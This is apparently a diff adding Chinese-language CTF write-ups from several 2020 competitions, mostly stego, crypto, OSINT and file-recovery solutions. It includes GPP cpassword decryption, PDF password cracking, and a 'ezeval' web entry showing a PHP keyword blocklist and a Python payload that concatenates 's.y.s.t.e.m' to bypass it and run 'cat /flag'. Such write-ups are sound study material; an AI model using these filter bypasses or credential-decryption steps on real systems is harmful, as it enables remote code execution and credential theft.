@@ -2440,7 +2440,33 @@ vvv = print(str(base64.b64decode(vv), encoding='utf-8'))
 print(str(base64.a85decode(vvv), encoding='utf-8'))
 ```
 
+###### [GKCTF2020]Harley Quinn
 
+```
+Ivy给Harley发了一个短信……算了，编不下去了，先听后看就完事了……
+
+音频解码可能有误差，密码为有意义的无空格小写短句 解密版本为1.25
+
+HQ
+
+hint:电话音&九宫格
+
+FreeFileCamouflage，下载的文件可能显示乱码
+```
+
+给了一个wav音频文件和一个jpg图片，按照提示先用dtmf2num看下wav图片的电话音，得到#222833344477773338866#。对照九宫格表，得到ctfisfun。
+
+之后按照提示，使用该密码用FreeFileCamouflage解密jpg文件得到flag
+
+###### 粽子的来历
+
+```
+曹操的私生子曹小明因为爸爸活着的时候得罪太多人，怕死后被抄家，所以把财富保存在一个谁也不知道的地方。曹小明比较喜欢屈原，于是把地点藏在他的诗中。三千年后，小明破译了这个密码，然而却因为担心世界因此掀起战争又亲手封印了这个财富并仿造当年曹小明设下四个可疑文件，找到小明喜欢的DBAPP标记，重现战国辉煌。(答案为正确值(不包括数字之间的空格)的小写32位md5值) 注意：得到的 flag 请包上 flag{} 提交
+```
+
+给了4个word文件，但是打开显示损坏。检查二进制发现一堆FF中夹着一段IComeFromxxxx，全部改为FF即可正常打开。
+
+打开发现每行行间距不一样，有1倍的有1.5倍的，猜测二进制。把1.5倍行间距的作为0，1倍行间距的作为1，md5后挨个提交，第三个文件为正确的flag
 
 ## crypto
 
@@ -3979,5 +4005,246 @@ m = pad + b'\x00'*13
 m = bytes_to_long(m)
 
 solve(m, e, n, c)
+```
+
+# VULNCON-CTF-2020
+
+#### Cryptography
+
+###### Double
+
+```
+Is it Double Encoding?
+
+6fp5ou50v5uj3x35gu4p456g4p15tv5wk5gu5b35gz4p44vm53x
+```
+
+一种叫twin-hex（双hex？）的加密，直接在线解密：
+
+https://www.calcresult.com/misc/cyphers/twin-hex.html
+
+```
+vulncon{Twin_Hex_Encoding_is_Hard}
+```
+
+###### can_you_c_the_password
+
+挨个文件检查，发现一个Groups.xml文件：
+
+```
+<?xml version="1.0" encoding="utf-8"?>
+<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="n00b_us3r" image="0" changed="2020-11-15 00:57:07" uid="{A8043038-7235-4F5E-BE8C-3076F5D31FE8}"><Properties action="C" fullName="" description="" cpassword="HlQWFdlPXQTU7n8W9VbsVTP245DcAJAUQeAZZfkJE/Q8ZlWgwj7CqKl6YiPvKbQFO7PWS7rSwbVtSSZUhJSj5YzjbkKtyXR5fP9VQDEieMU" changeLogon="0" noChange="0" neverExpires="0" acctDisabled="0" userName="n00b_us3r"/></User>
+</Groups>
+```
+
+GP3Finder解码得到flag：
+
+```
+python3 cli.py -D HlQWFdlPXQTU7n8W9VbsVTP245DcAJAUQeAZZfkJE/Q8ZlWgwj7CqKl6YiPvKbQFO7PWS7rSwbVtSSZUhJSj5YzjbkKtyXR5fP9VQDEieMU
+
+        Group Policy Preference Password Finder (GP3Finder) 5.0.0
+        Copyright (C) 2020  Oliver Morton
+        This program comes with ABSOLUTELY NO WARRANTY.
+        This is free software, and you are welcome to redistribute it
+        under certain conditions. See GPLv2 License.
+
+INFO: gp3finder: Decrypted password is 38 characters.
+INFO: gp3finder: --------------------------------------
+INFO: gp3finder: vulncon{s3cur1ty_h4s_3volv3d_s0__much}
+INFO: gp3finder: --------------------------------------
+```
+
+###### is_it_magic
+
+```
+Can you recover the secret XOR key we used to encrypt the flag?
+```
+
+给了个文件smokeaway.jpg.enc，题目提示异或，猜测是jpg图片异或得到了该加密文件。随便找两张jpg图片的文件头异或看下：
+
+```
+s1 = 'FF D8 FF E8 00 10 4A 46 49 46 00 01 01 00 00 01 00 00'.split(' ')
+s2 = 'FF D8 FF E0 00 10 4A 46 49 46 00 01 01 01 00 60 00 60'.split(' ')
+
+
+f = open(r'C:\Users\hp430\Desktop\is_it_magic\Challenge_files\smokeaway.jpg.enc', 'rb')
+
+for i in s1:
+    a1 = ord(bytes().fromhex(i))
+    a2 = ord(f.read(1))
+    print(a1^a2, end=',')
+
+print('')
+f.close()
+f = open(r'C:\Users\hp430\Desktop\is_it_magic\Challenge_files\smokeaway.jpg.enc', 'rb')
+
+for i in s2:
+    a1 = ord(bytes().fromhex(i))
+    a2 = ord(f.read(1))
+    print(a1^a2, end=',')
+
+f.close()
+```
+
+```
+70,204,249,173,113,240,255,177,126,65,203,132,70,205,248,136,112,220,
+70,204,249,165,113,240,255,177,126,65,203,132,70,204,248,233,112,188,
+```
+
+故可以初步猜测key估是70,204,249,173,113,240,255,177,126,65,203,132或者70,204,249,165,113,240,255,177,126,65,203,132，都试一下：
+
+```
+keys = ['70,204,249,173,113,240,255,177,126,65,203,132', '70,204,249,165,113,240,255,177,126,65,203,132']
+
+f = open(r'C:\Users\hp430\Desktop\is_it_magic\Challenge_files\smokeaway.jpg.enc', 'rb')
+s = f.read()
+
+for num, key in enumerate(keys):
+    key = key.split(',')
+    index = 0
+    s1 = b''
+    for i in s:
+        sub_key = key[index]
+        s1 += chr(ord(i)^int(sub_key))
+        index += 1
+        if index >= len(key):
+            index = 0
+    f = open(r'C:\Users\hp430\Desktop\is_it_magic\Challenge_files\smokeaway%s.jpg'%num, 'wb')
+    f.write(s1)
+    f.close()
+```
+
+得到的图片中即可看见flag。
+
+#### Miscellaneous
+
+###### All I know was zip
+
+给了一个txt文件，内容为16进制字符串的：
+
+```
+0x50, 0x4B, 0x03, 0x04, 0x14, 0x00, 0x00, 0x00, 0x08, 0x00, 0x6A, 0x5A, 0x85, 0x51, 0xC4, 0xDC,
+```
+
+可以转换成zip文件：
+
+```
+or_file_path = r'C:\Users\hp430\Desktop\All I know was zip.txt'
+result_file_path = r'C:\Users\hp430\Desktop\result.zip'
+
+or_file = open(or_file_path, 'r')
+result_file = open(result_file_path, 'wb')
+
+for data in or_file.readlines():
+    data = data.strip()
+    for sub_data in data.split(','):
+        sub_data = sub_data.strip()
+        if sub_data:
+            save_data = bytearray.fromhex(sub_data[2:])
+            result_file.write(save_data)
+
+result_file.close()
+```
+
+解压得到一个带密码的pdf文件，用pdfcrack爆破得到弱口令butterfly。
+
+查看pdf，发现有两张图片，其中一张是：
+
+![1](/1.bmp)
+
+谷歌搜图可以发现是D&D 5e Languages中的Draconic，翻译得到flag。
+
+https://5elanguages.website/draconic/
+
+#### OSINT
+
+###### Find The Coin
+
+```
+Hackers stole lot of money from Kucoin(Popular exchanger), we found a recent transaction of the value 100,000,000 DX at 26 Nov 2020 happened from the hacker's wallet can you find the tx id for me ?
+```
+
+要查一笔区块链交易，直接https://ethplorer.io/搜索即可找到。
+
+# BMZCTF-1st
+
+#### web
+
+###### ezeval
+
+```php+HTML
+ <?php
+highlight_file(__FILE__);
+$cmd=$_POST['cmd'];
+$cmd=htmlspecialchars($cmd);
+$black_list=array('php','echo','`','preg','server','chr','decode','html','md5','post','get','file','session','ascii','eval','replace','assert','exec','cookie','$','include','var','print','scan','decode','system','func','ini_','passthru','pcntl','open','link','log','current','local','source','require','contents');
+$cmd = str_ireplace($black_list,"BMZCTF",$cmd);
+eval($cmd);
+
+?> 
+```
+
+命令执行，但是过滤常用执行函数，可以利用php顺序执行的特性拼接字符串绕过：
+
+```python
+import requests
+
+data = {'cmd':'''(s.y.s.t.e.m)('cat /flag');'''}
+
+print(requests.post('http://www.bmzclub.cn:20458/',data=data).text)
+```
+
+# 2020zongheng
+
+#### misc
+
+###### My_Secret
+
+```
+LSB have a deep secret
+
+PASS1 is 123456
+```
+
+给了一张jpg图片一张png图片一个wav音频。题目提示了lsb还给了密码，直接cloacked-pixel搞起：
+
+```
+root@ubuntu:/home/ctf/misc/cloacked-pixel# ./go.sh
+[+] Image size: 262x290 pixels.
+[+] Written extracted data to flag.
+root@ubuntu:/home/ctf/misc/cloacked-pixel# cat flag
+38d668578a3686abroot@ubuntu:/home/ctf/misc/cloacked-pixel# cat go.sh
+python lsb.py extract stego.png flag 123456
+```
+
+题目还提示了deep，给了wav文件，用DeepSound可以处理（密码为lsb得到的38d668578a3686a）得到密码carrier。
+
+题目最后还有一个提示secret，还剩一个jpg文件没用，用OurSecret配合密码carrier得到flag
+
+###### 马赛克
+
+给了一张打了马赛克的图片，用https://github.com/beurtschipper/Depix可去码：
+
+```
+root@ubuntu:/home/ctf/misc/Depix# ./go.sh
+INFO:root:Loading pixelated image from mosaic.png
+INFO:root:Loading search image from images/searchimages/debruinseq_notepad_Windows10_closeAndSpaced.png
+INFO:root:Finding color rectangles from pixelated space
+INFO:root:Found 93 same color rectangles
+INFO:root:91 rectangles left after moot filter
+INFO:root:Found 2 different rectangle sizes
+INFO:root:Finding matches in search image
+INFO:root:Removing blocks with no matches
+INFO:root:Splitting single matches and multiple matches
+INFO:root:[16 straight matches | 72 multiple matches]
+INFO:root:Trying geometrical matches on single-match squares
+INFO:root:[39 straight matches | 49 multiple matches]
+INFO:root:Trying another pass on geometrical matches
+INFO:root:[51 straight matches | 37 multiple matches]
+INFO:root:Writing single match results to output
+INFO:root:Writing average results for multiple matches to output
+INFO:root:Saving output image to: output.png
+root@ubuntu:/home/ctf/misc/Depix# cat go.sh
+python3 depix.py -p mosaic.png -s images/searchimages/debruinseq_notepad_Windows10_closeAndSpaced.png
 ```
 
